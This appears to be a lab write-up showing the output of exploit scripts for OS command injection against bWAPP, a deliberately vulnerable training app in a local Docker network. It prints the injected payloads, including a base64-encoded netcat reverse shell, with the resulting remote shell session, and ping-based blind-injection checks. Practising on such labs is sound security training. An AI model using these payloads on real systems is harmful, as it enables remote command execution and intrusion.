# bWAPP - an extremely buggy web app
## Contents
- [bwapp OS Command Injection Medium Vulnerability](#bwapp-os-command-injection-medium-vulnerability)
- [bwapp OS Command Injection Blind Medium Vulnerability](#bwapp-os-command-injection-blind-medium-vulnerability)

## bwapp OS Command Injection Medium Vulnerability
- OS Command Injection Medium Vulnerability to RCE
```bash
$ python3 bwapp_medium_os_command_injection_rce.py 

    >> bwapp - OS Command Injection
    >> by twseptian

[*] URL: 172.17.0.3/login.php
[✓] Logged in Successfully
[*] OS Command Injection
[*] Information: 172.17.0.1:4444
[!] Command: www.nsa.gov | echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTcyLjE3LjAuMSA0NDQ0ID4vdG1wL2Y= | base64 -d | bash
[!] Take RCE

listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.3] 34516
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ pwd
/app
$
```
- OS Command Injection Medium Vulnerability
```bash
$ python3 bwapp_medium_os_command_injection.py 

    >> bwapp - OS Command Injection
    >> by twseptian

[*] URL: 172.17.0.3/login.php
[✓] Logged in Successfully
[*] OS Command Injection
[!] Command: www.nsa.gov|ping -c5 172.17.0.1
[✓] Command injection success
```
response
```bash
$ sudo tcpdump icmp -i docker0
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on docker0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
22:43:39.054845 IP 172.17.0.3 > 172.17.0.1: ICMP echo request, id 822, seq 1, length 64
22:43:39.054861 IP 172.17.0.1 > 172.17.0.3: ICMP echo reply, id 822, seq 1, length 64
22:43:40.071071 IP 172.17.0.3 > 172.17.0.1: ICMP echo request, id 822, seq 2, length 64
22:43:40.071132 IP 172.17.0.1 > 172.17.0.3: ICMP echo reply, id 822, seq 2, length 64
22:43:41.095055 IP 172.17.0.3 > 172.17.0.1: ICMP echo request, id 822, seq 3, length 64
22:43:41.095103 IP 172.17.0.1 > 172.17.0.3: ICMP echo reply, id 822, seq 3, length 64
22:43:42.118890 IP 172.17.0.3 > 172.17.0.1: ICMP echo request, id 822, seq 4, length 64
22:43:42.118939 IP 172.17.0.1 > 172.17.0.3: ICMP echo reply, id 822, seq 4, length 64
22:43:43.143058 IP 172.17.0.3 > 172.17.0.1: ICMP echo request, id 822, seq 5, length 64
22:43:43.143106 IP 172.17.0.1 > 172.17.0.3: ICMP echo reply, id 822, seq 5, length 64
```
## bwapp OS Command Injection Blind Medium Vulnerability
- OS Command Injection Vulnerability Blind to RCE
```bash
$ python3 bwapp_medium_os_command_injection_blind_rce.py 

    >> bwapp - OS Command Injection
    >> by twseptian

[*] URL: 172.17.0.3/login.php
[✓] Logged in Successfully
[*] OS Command Injection
[*] Information: 172.17.0.1:4444
[!] Command: www.nsa.gov | echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTcyLjE3LjAuMSA0NDQ0ID4vdG1wL2Y= | base64 -d | bash
[!] Take RCE

listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.3] 34518
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ pwd
/app
$
```
- OS Command Injection Vulnerability Blind
```bash
$ python3 bwapp_low_os_command_injection_blind.py    

    >> bwapp - OS Command Injection Blind
    >> by twseptian

[*] URL: 172.17.0.3/login.php
[✓] Logged in Successfully
[*] OS Command Injection - Blind
[!] Command: 127.0.0.1|ping -c5 172.17.0.1
[✓] Command injection success
```
response
```bash
$ sudo tcpdump icmp -i docker0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on docker0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
23:00:02.551793 IP 172.17.0.3 > 172.17.0.1: ICMP echo request, id 891, seq 1, length 64
23:00:02.551826 IP 172.17.0.1 > 172.17.0.3: ICMP echo reply, id 891, seq 1, length 64
23:00:03.559074 IP 172.17.0.3 > 172.17.0.1: ICMP echo request, id 891, seq 2, length 64
23:00:03.559138 IP 172.17.0.1 > 172.17.0.3: ICMP echo reply, id 891, seq 2, length 64
23:00:04.583065 IP 172.17.0.3 > 172.17.0.1: ICMP echo request, id 891, seq 3, length 64
23:00:04.583119 IP 172.17.0.1 > 172.17.0.3: ICMP echo reply, id 891, seq 3, length 64
23:00:05.607048 IP 172.17.0.3 > 172.17.0.1: ICMP echo request, id 891, seq 4, length 64
23:00:05.607097 IP 172.17.0.1 > 172.17.0.3: ICMP echo reply, id 891, seq 4, length 64
23:00:06.630767 IP 172.17.0.3 > 172.17.0.1: ICMP echo request, id 891, seq 5, length 64
23:00:06.630825 IP 172.17.0.1 > 172.17.0.3: ICMP echo reply, id 891, seq 5, length 64
```